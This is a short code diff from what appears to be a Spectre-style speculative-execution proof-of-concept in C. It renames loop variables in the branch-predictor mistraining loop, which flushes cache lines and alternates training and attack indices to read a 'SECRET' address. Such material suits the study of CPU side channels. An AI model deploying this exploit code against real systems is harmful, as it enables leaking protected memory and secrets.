@@ -89,7 +89,7 @@ void init_attack()
 */
 void readMemoryByte(size_t target_idx)
 {
-    int i, j, k, curr_char;
+    int i, j, curr_char;
     unsigned int junk = 0;
     size_t train_idx, idx;
     uint64_t time1, time_diff;
@@ -107,16 +107,16 @@ void readMemoryByte(size_t target_idx)
         // Training idx is the correct idx that is within arr1_size, which will train the branch predictor that brach is mostly taken
         train_idx = tries % arr1_size;
 
-        for (j = TRAINING_LOOPS - 1; j >= 0; j--)
+        for (i = TRAINING_LOOPS - 1; i >= 0; i--)
         {
             _mm_clflush(&arr1_size);
             // This loop executes the delay inbetween the successive training loops
-            for (int z = 0; z < INBETWEEN_DELAY; z++)
+            for (j = 0; j < INBETWEEN_DELAY; j++)
                 ;
 
-            //idx = (j % 6) ? train_idx : target_idx;
+            //idx = (i % 6) ? train_idx : target_idx;
             //We should avoid the if-else condition here, as the if-else invokes the use of branch predictor here, which will then detect our logic here
-           idx = IS_ATTACK[j] * target_idx + (!IS_ATTACK[j]) * train_idx;
+           idx = IS_ATTACK[i] * target_idx + (!IS_ATTACK[i]) * train_idx;
 
             /* Call the victim function with the training_x (to mistrain branch predictor) or target_x (to attack the SECRET address) */
             fetch_function(idx);
